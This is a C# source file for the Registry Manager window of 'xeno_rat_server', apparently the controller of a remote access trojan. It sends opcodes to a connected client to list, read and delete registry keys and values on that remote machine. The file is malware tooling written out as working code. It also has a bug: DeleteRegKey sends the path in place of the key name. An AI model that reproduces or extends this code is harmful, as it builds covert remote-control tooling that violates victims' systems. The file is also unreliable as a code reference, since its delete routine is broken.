using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class Registry_Manager : Form
    {
        private static readonly Dictionary<byte, string> TypeIdentifierReverseMap = new Dictionary<byte, string>
        {
            { 1, "REG_SZ" },
            { 2, "REG_EXPAND_SZ" },
            { 3, "REG_BINARY" },
            { 4, "REG_DWORD" },
            { 5, "REG_MULTI_SZ" },
            { 6, "REG_QWORD" },
            { 7, "Unknown" }
        };

        Node client;
        public Registry_Manager(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            StartAdd();

        }
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (!this.IsDisposed)
                {
                    this.Invoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        public async Task StartAdd() 
        {
            RegInfo HKLM = await GetRegInfo("HKLM");
            RegInfo HKCU = await GetRegInfo("HKCU");
            TreeNode treeNodeHKCU = new TreeNode("HKCU");
            treeNodeHKCU.Tag = HKCU;
            TreeNode treeNodeHKLM = new TreeNode("HKLM");
            treeNodeHKLM.Tag = HKLM;
            treeView1.BeginUpdate();
            treeView1.Nodes.Add(treeNodeHKCU);
            foreach (string i in HKCU.subKeys) 
            {
                TreeNode temp=treeView1.Nodes[0].Nodes.Add(i);
                temp.Tag = i;
            }
            treeView1.Nodes.Add(treeNodeHKLM);
            foreach (string i in HKLM.subKeys)
            {
                TreeNode temp = treeView1.Nodes[1].Nodes.Add(i);
                temp.Tag = i;
            }
            treeView1.EndUpdate();
        }
        public async Task<RegInfo> GetRegInfo(string path)
        {
            byte[] opcode = new byte[] { 1 };
            byte[] data = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(data);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            if (!worked) 
            {
                return null;
            }
            byte[] SearlizedData = await client.ReceiveAsync();
            return DeserializeRegInfo(SearlizedData);
        }
        public async Task<bool> DeleteRegSubKey(string path) 
        {
            byte[] opcode = new byte[] { 2 };
            byte[] data = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(data);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            return worked;
        }
        public async Task<bool> DeleteRegKey(string path, string key)
        {
            byte[] opcode = new byte[] { 3 };
            byte[] byte_path = Encoding.UTF8.GetBytes(path);
            byte[] byte_key = Encoding.UTF8.GetBytes(path);
            await client.SendAsync(opcode);
            await client.SendAsync(byte_path);
            await client.SendAsync(byte_key);
            bool worked = (await client.ReceiveAsync())[0] == 1;
            return worked;
        }
        public static RegInfo DeserializeRegInfo(byte[] data)
        {
            RegInfo regInfo = new RegInfo();

            using (MemoryStream memoryStream = new MemoryStream(data))
            using (BinaryReader reader = new BinaryReader(memoryStream))
            {
                regInfo.ContainsSubKeys = reader.ReadBoolean();
                int subKeyCount = reader.ReadInt32();
                regInfo.subKeys = new string[subKeyCount];
                for (int i = 0; i < subKeyCount; i++)
                {
                    regInfo.subKeys[i] = reader.ReadString();
                }
                regInfo.FullPath = reader.ReadString();
                int valueCount = reader.ReadInt32();

                for (int i = 0; i < valueCount; i++)
                {
                    RegValue value = new RegValue();
                    value.KeyName = reader.ReadString();
                    value.FullPath = reader.ReadString();
                    value.Type = TypeIdentifierReverseMap[reader.ReadByte()];

                    byte valueType = reader.ReadByte();
                    switch (valueType)
                    {
                        case 1: // REG_SZ
                            value.Value = reader.ReadString();
                            break;
                        case 2: // REG_EXPAND_SZ
                            value.Value = reader.ReadString();
                            break;
                        case 3: // REG_BINARY
                            int byteArrayLength = reader.ReadInt32();
                            value.Value = reader.ReadBytes(byteArrayLength);
                            break;
                        case 4: // REG_DWORD
                            value.Value = reader.ReadInt32();
                            break;
                        case 5: // REG_MULTI_SZ
                            int stringArrayLength = reader.ReadInt32();
                            string[] stringArray = new string[stringArrayLength];
                            for (int j = 0; j < stringArrayLength; j++)
                            {
                                stringArray[j] = reader.ReadString();
                            }
                            value.Value = stringArray;
                            break;
                        case 6: // REG_QWORD
                            value.Value = reader.ReadInt64();
                            break;
                        default: // Unknown
                            value.Value = null;
                            break;
                    }

                    regInfo.Values.Add(value);
                }
            }

            return regInfo;
        }
        private async void treeView1_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            foreach (TreeNode i in e.Node.Nodes)
            {
                RegInfo reginfo = await GetRegInfo(i.FullPath);
                i.Tag = reginfo;
                if (reginfo == null) continue;
                foreach (string n in reginfo.subKeys) 
                {
                    TreeNode temp =i.Nodes.Add(n);
                    temp.Tag = n;
                }
            }
        }
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (treeView1.SelectedNode != null)
            {
                listView1.BeginUpdate();
                listView1.Items.Clear();
                TreeNode clickedNode = treeView1.SelectedNode;
                RegInfo regInfo = clickedNode.Tag as RegInfo;
                if (regInfo == null) return;
                foreach (RegValue i in regInfo.Values) 
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Tag = i;
                    lvi.Text = i.KeyName;
                    if (i.Type == "REG_SZ" || i.Type == "REG_EXPAND_SZ")
                    {
                        lvi.SubItems.Add(i.Value.ToString());
                    }
                    else if (i.Type == "REG_BINARY")
                    {
                        lvi.SubItems.Add(BitConverter.ToString((byte[])i.Value));
                    }
                    else if (i.Type == "REG_MULTI_SZ") 
                    {
                        lvi.SubItems.Add(string.Join(" ", (string[])i.Value));
                    }
                    else
                    {
                        lvi.SubItems.Add(i.Value.ToString());
                    }
                    lvi.SubItems.Add(i.Type);
                    listView1.Items.Add(lvi);
                }
                listView1.EndUpdate();
                textBox1.Text = clickedNode.FullPath;
            }
        }
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private async void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = string.Empty;
            listView1.Items.Clear();
            treeView1.Nodes.Clear();
            await StartAdd();

        }

        private void treeView1_Click(object sender, EventArgs e)
        {
        }

        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                try
                {
                    //RegInfo procnode = ((RegInfo)e.Node.Tag);
                    //ContextMenuStrip PopupMenu = new ContextMenuStrip();
                    //PopupMenu.Items.Add("Kill " + procnode.Name);
                    //PopupMenu.ItemClicked += new ToolStripItemClickedEventHandler((object _, ToolStripItemClickedEventArgs __) => killPid(procnode.PID));
                    //PopupMenu.Show(Cursor.Position);
                }
                catch
                {
                    MessageBox.Show("something went wrong...");
                }
            }
        }
    }
    public class RegValue
    {
        public string KeyName { get; set; }
        public string FullPath { get; set; }
        public string Type { get; set; }
        public object Value { get; set; }
    }
    public class RegInfo
    {
        public bool ContainsSubKeys { get; set; }
        public string[] subKeys { get; set; }
        public string FullPath { get; set; }
        public List<RegValue> Values = new List<RegValue>();
    }
}
